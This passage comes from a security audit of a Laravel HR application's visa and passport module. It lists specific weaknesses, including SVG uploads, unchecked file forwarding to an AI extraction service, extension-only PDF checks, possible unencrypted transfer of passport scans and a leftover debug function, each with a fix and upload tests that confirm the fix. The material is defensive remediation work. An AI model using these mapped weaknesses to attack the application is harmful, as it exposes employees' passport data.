| `RenewalController.php:278` | Renewal document rule allows **`svg`** (can carry script). | Remove `svg` (and `gif` unless needed). |
| `RenewalController::PassportExpiry` (`:1534`), `CheckCv` (`:1646`), `Education` (`:1699`), `Experience` (`:1755`) | Forward **any** uploaded file to the AI service with no type or size check. Nothing is stored, but anyone with access can push arbitrary files at the AI service. | `mimes:pdf,jpg,jpeg,png,heic,heif|max:5120` on each. |
| `FetchDataAiController::store` (`:57-66`) | "PDF only" is checked by the **file name extension** (`getClientOriginalExtension`), not the content. | Use `mimes:pdf` / `mimetypes:application/pdf`. |

**VERIFY:** upload `test.html` renamed `test.pdf` to `FetchDataAiController::store` → rejected. Upload `x.svg` to renewal → rejected. `CreateEmployee` with a `.exe` in `documents[]` → rejected. Normal PDF/JPG uploads still work end to end.

---

#### V-05 · MEDIUM · HUMAN CHECK · Passports and visas are sent to the AI extraction service

**Where:** visa and passport scans are uploaded to an AI extraction service to read the fields automatically: `RenewalController.php:311, 344, 1540` (`config('services.ai_extract.url')`), `FetchDataAiController.php:182-236` (`config('services.ai_extract.base_url')` → `extract_async` / `extract_result`). `config/services.php:84-87`:
```php
'ai_extract' => [
    'url'      => env('AI_extract_work_details_URL'),
    'base_url' => env('AI_URL', 'http://localhost:8001/'),
],
```

**Why it's a check, not a confirmed bug:** the default is `http://localhost:8001` (a service on the same server, which is fine). But if production points `AI_URL` / `AI_extract_work_details_URL` at **another server**, then:
- with `http://` instead of `https://`, **passport images cross the network unencrypted**;
- if that service is operated by a **third party** (or sends data on to one, e.g. an LLM API), the international client's HR/legal team will need to know, because this is personal data leaving the system.

**`HUMAN` answers (record here):**
1. Where does the AI extraction service run (same server / our other server / third party)? What are the production values of `AI_URL` and `AI_extract_work_details_URL` (host only, and whether they're `https`)?
2. Does that service keep the uploaded images, and does it send them to any outside AI provider?
3. If it's not on the same server: it must use `https`, and the call should send an API key (the current curl calls send none, `FetchDataAiController.php:195-206`), so nobody else can use the service.

**VERIFY:** the recorded answers above, plus `php artisan tinker --execute="echo parse_url(config('services.ai_extract.base_url'), PHP_URL_SCHEME), ' ', parse_url(config('services.ai_extract.base_url'), PHP_URL_HOST);"` on production → either `http localhost`/`127.0.0.1`, or `https <host>`.

---

#### V-06 · LOW · Small items

| Where | Item | Fix |
|---|---|---|
| `RenewalController::GetEmployeeDetails` (`:85`) | Loads the employee with **no resort check**. The result is **never used** (all returned data is resort-scoped), so nothing leaks today. | Add the resort filter or delete the line. |
| `DocumentController::FetchAithrowData` (`:78-82`) | Leftover debug function that just runs `dd(env('AI_URL'))`. Not routed today, but it would print the internal AI address if it ever were. | Delete it. |
| `XpactEmployeeController.php:879-881` (`ReceiptNo` column, listed in `rawColumns` at `:888`) | HR-typed receipt number printed raw. | Wrap in `e()`. |
| `ConfigurationController.php:284` | Nationality import file saved with raw `->store('imports')` and kept (same as P-04 / W-06). | Delete after import. |

---

### 7.5 Next modules  ·  PENDING AUDIT
Done so far: Payroll (7.1), Manning & Budgeting (7.2), Talent Acquisition (7.3), Visa & employee documents (7.4). Remaining (most sensitive first): People / Employee profiles → Disciplinary → Leave & Island Pass → Time & Attendance → Performance → Incidents → Accommodation → Learning → Survey → File Management → SOS → Wisdom AI.

---

## 9. FOUND WHILE FIXING (Claude Code appends here — do not fix in the same change)

| Found during | File:line | What | Severity guess |
|---|---|---|---|
| | | | |
